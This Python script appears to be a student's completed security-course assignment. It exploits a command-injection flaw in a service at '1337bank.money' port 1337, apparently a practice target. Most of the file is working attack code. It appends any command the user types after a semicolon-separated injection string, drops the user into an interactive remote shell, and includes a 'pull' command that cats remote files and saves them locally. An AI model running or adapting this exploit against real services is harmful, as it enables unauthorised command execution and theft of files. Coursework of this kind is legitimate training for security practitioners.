"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here


lastdir = ""

def execute_cmd(cmd):
   global lastdir 
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
   s.connect((host, port));
   y = s.recv(1024);
   val = cmd.split(" ");
   if val[0] == "cd": 
     lastdir = val[1]
   if val[0] != "cd" and len(lastdir) > 0:
     cmd = "cd " + lastdir + ";" + cmd;
   toSend = "1337bank.money; echo 123;" + cmd + ";\n\n";
   s.send(toSend.encode('utf-8'));
   a = s.recv(4096);
   b = s.recv(4096);
   length = len(a+b);
   input_string = str(a + b);
   input_string = input_string[input_string.index("123") + 3:-1]
   w = input_string.split('\\n');
   for val in w:
     print(val);

def execute_pull(cmd):
   global lastdir 
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
   s.connect((host, port));
   y = s.recv(1024);
   val = cmd.split(" ");
   if val[0] == "cd": 
     lastdir = val[1]
   if val[0] != "cd" and len(lastdir) > 0:
     cmd = "cd " + lastdir + ";" + cmd;
   toSend = "1337bank.money; echo 123;" + cmd + ";\n\n";
   s.send(toSend.encode('utf-8'));
   a = s.recv(4096);
   b = s.recv(4096);
   length = len(a+b);
   input_string = str(a + b);
   input_string = input_string[input_string.index("123") + 3:-1]
   w = input_string.split('\\n');
   return w
  
   """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

if __name__ == '__main__':
  while True:
    cmd = input(">");
    if cmd == "shell":
      while True:
        x = input("Enter in a command: ");
        execute_cmd(x);
        if x == "quit":
          break;
    elif "pull" in cmd:
      checkPull = cmd.split(" ");
      something = execute_pull("cat " + checkPull[1]);
      with open(checkPull[2], "w+") as myFile:
        for val in something:
          if val != '':
            myFile.write(str(val))
      
    elif cmd == "help": 
      print(" 1) `shell`                               Drop into an interactive shell and allow users to gracefully `exit`");
      print(" 2) `pull <remote-path> <local-path>`     Download files");
      print(" 3) `help`                                Shows this help menu");
      print(" 4) `quit`                                Quit the shell   ");
    elif cmd == "quit":
      break;
    else:
      print("INVALID COMMAND\n");
